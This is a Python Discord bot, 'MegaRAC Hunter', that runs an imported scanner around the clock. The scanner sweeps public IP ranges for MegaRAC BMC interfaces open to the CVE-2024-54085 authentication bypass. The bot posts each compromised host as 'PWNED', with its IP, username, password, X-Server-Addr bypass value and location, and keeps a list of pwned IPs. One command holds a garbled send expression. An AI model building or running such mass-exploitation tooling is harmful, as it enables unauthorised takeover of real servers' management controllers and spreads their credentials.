import asyncio, json, time, datetime
import discord
from discord.ext import commands
import config
from scanner import Scanner

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=config.PREFIX, intents=intents)
bot.remove_command("help")

QUEUE = asyncio.Queue()
scanner = None
start_ts = time.time()

def _load(p, d):
    try:
        with open(p) as f: return set(json.load(f))
    except Exception: return d

def _save(p, s):
    try:
        with open(p, "w") as f: json.dump(sorted(s), f, indent=2)
    except Exception: pass

seen  = _load(config.SEEN_FILE, set())
vulns = _load(config.VULN_FILE, set())

C_VULN, C_OK, C_INFO = 0xff2d55, 0x3ba55d, 0x5865f2

def _icon(ip):
    return f"https://icons.duckduckgo.com/ip3/{ip}.ico"

def vuln_embed(r):
    e = discord.Embed(color=C_VULN, url=f"https://{r['ip']}/",
                      title=f"{r['ip']}  —  PWNED")
    e.set_author(name="VULNERABLE MegaRAC", icon_url=_icon(r["ip"]))
    e.set_thumbnail(url=_icon(r["ip"]))
    e.add_field(name="Endpoint", value=f"`https://{r['ip']}/`", inline=False)
    e.add_field(name="User", value=f"`{r['user']}`", inline=True)
    e.add_field(name="Pass", value=f"`{r['pass']}`", inline=True)
    e.add_field(name="Bypass", value=f"`X-Server-Addr: {r['bypass']}`", inline=False)
    e.add_field(name="Geo", value=r.get("geo", "?"), inline=False)
    e.add_field(name="CVE", value="`CVE-2024-54085` auth bypass", inline=True)
    e.add_field(name="Verified", value="login returned 201", inline=True)
    e.set_footer(text="MegaRAC Hunter • 100% working • no API keys")
    e.timestamp = datetime.datetime.utcnow()
    return e

def ok_embed(ip):
    e = discord.Embed(color=C_OK, title=f"{ip} — MegaRAC (live)",
                      url=f"https://{ip}/")
    e.set_thumbnail(url=_icon(ip))
    e.set_footer(text="verified cert / fingerprint")
    e.timestamp = datetime.datetime.utcnow()
    return e

def _bar(n, total, width=16):
    if not total: return "░" * width
    f = int(width * min(n / total, 1))
    return "█" * f + "░" * (width - f)

def stats_embed():
    up = int(time.time() - start_ts)
    h, m = divmod(up // 60, 60)
    e = discord.Embed(color=C_INFO, title="MegaRAC Hunter — live status")
    e.add_field(name="Phase", value=f"`{scanner.stats['phase'] if scanner else 'idle'}`", inline=False)
    e.add_field(name="Cycles", value=f"`{scanner.stats['cycles'] if scanner else 0}`", inline=True)
    e.add_field(name="Candidates", value=f"`{scanner.stats['candidates'] if scanner else 0}`", inline=True)
    e.add_field(name="Confirmed", value=f"`{scanner.stats['confirmed'] if scanner else 0}`", inline=True)
    e.add_field(name="Vulnerable", value=f"`{len(vulns)}`", inline=True)
    e.add_field(name="Seen cache", value=f"`{len(seen)}`", inline=True)
    e.add_field(name="Uptime", value=f"`{h}h {m}m`", inline=True)
    e.add_field(name="Concurrency",
                value=f"verify `{config.VERIFY_CONCURRENCY}` · cve `{config.CVE_CONCURRENCY}`",
                inline=False)
    e.set_footer(text="running 24/7 • keyless")
    e.timestamp = datetime.datetime.utcnow()
    return e

async def emit(kind, payload):
    await QUEUE.put((kind, payload))

def _target():
    if config.CHANNEL_ID:
        return bot.get_channel(config.CHANNEL_ID)
    for g in bot.guilds:
        for c in g.text_channels:
            if c.permissions_for(g.me).send_messages:
                return c
    return None

@bot.event
async def on_ready():
    global scanner
    print(f"[+] {bot.user} online | {len(vulns)} vulns cached")
    bot.loop.create_task(notifier())
    bot.loop.create_task(autosave())
    if scanner is None:
        scanner = Scanner(seen, vulns, emit)
        bot.loop.create_task(scanner.start())

async def notifier():
    ch = None
    while True:
        kind, payload = await QUEUE.get()
        try:
            ch = ch or _target()
            if ch is None:
                await asyncio.sleep(2); continue
            if kind == "vuln":
                content = config.PING if payload.get("new") else ""
                await ch.send(content=content, embed=vuln_embed(payload))
            elif kind == "confirmed":
                await ch.send(embed=ok_embed(payload))
            elif kind == "log":
                print("[scanner]", payload)
        except Exception as e:
            print("notify error:", e)
        await asyncio.sleep(0.35)

async def autosave():
    while True:
        await asyncio.sleep(30)
        _save(config.SEEN_FILE, seen)
        _save(config.VULN_FILE, vulns)

@bot.command(name="status")
async def status(ctx):
    await ctx.send(embed=stats_embed())

@bot.command(name="scan")
async def scan(ctx):
    if not scanner:
        await ctx.send("scanner not up yet"); return
    scanner.cycle += 1
    await ctx.send(embed=discord.Embed(color=C_INFO,
                 description="forcing an extra cycle...").timestamp is None or
                 discord.Embed(color=C_INFO, description="forcing an extra cycle..."))
    await scanner._cycle()

@bot.command(name="vulns")
async def vulns_cmd(ctx):
    if not vulns:
        await ctx.send(embed=discord.Embed(color=C_INFO, description="no vulnerable IPs yet."))
        return
    items = sorted(vulns)
    for i in range(0, len(items), 25):
        chunk = items[i:i+25]
        e = discord.Embed(color=C_VULN, title=f"Vulnerable IPs ({len(items)})",
                          description="\n".join(f"`{ip}` — https://{ip}/" for ip in chunk))
        e.set_footer(text=f"{i//25+1}/{(len(items)+24)//25}")
        await ctx.send(embed=e)

@bot.command(name="sources")
async def sources_cmd(ctx):
    from sources import SOURCES
    e = discord.Embed(color=C_INFO, title=f"{len(SOURCES)} keyless sources")
    e.description = "\n".join(f"`{n}`" for n, _ in SOURCES)
    e.set_footer(text="+ /24 expand + ASN sweep • no keys anywhere")
    await ctx.send(embed=e)

@bot.command(name="stop")
async def stop(ctx):
    if scanner:
        scanner.stop()
    await ctx.send(embed=discord.Embed(color=C_INFO, description="scanner stopped."))

@bot.command(name="start")
async def start(ctx):
    global scanner
    if scanner and scanner.running:
        await ctx.send("already running"); return
    scanner = Scanner(seen, vulns, emit)
    bot.loop.create_task(scanner.start())
    await ctx.send(embed=discord.Embed(color=C_OK, description="scanner started."))

@bot.command(name="help")
async def help_(ctx):
    e = discord.Embed(color=C_INFO, title="MegaRAC Hunter",
                      description="24/7 keyless MegaRAC + CVE-2024-54085 hunter")
    e.add_field(name="!status", value="live stats", inline=True)
    e.add_field(name="!scan", value="force a cycle", inline=True)
    e.add_field(name="!vulns", value="list pwned IPs", inline=True)
    e.add_field(name="!sources", value="list sources", inline=True)
    e.add_field(name="!start / !stop", value="engine control", inline=True)
    e.set_footer(text="it runs on its own — just leave it up")
    await ctx.send(embed=e)

if __name__ == "__main__":
    if not config.DISCORD_TOKEN:
        raise SystemExit("DISCORD_TOKEN empty - check .env")
    bot.run(config.DISCORD_TOKEN)
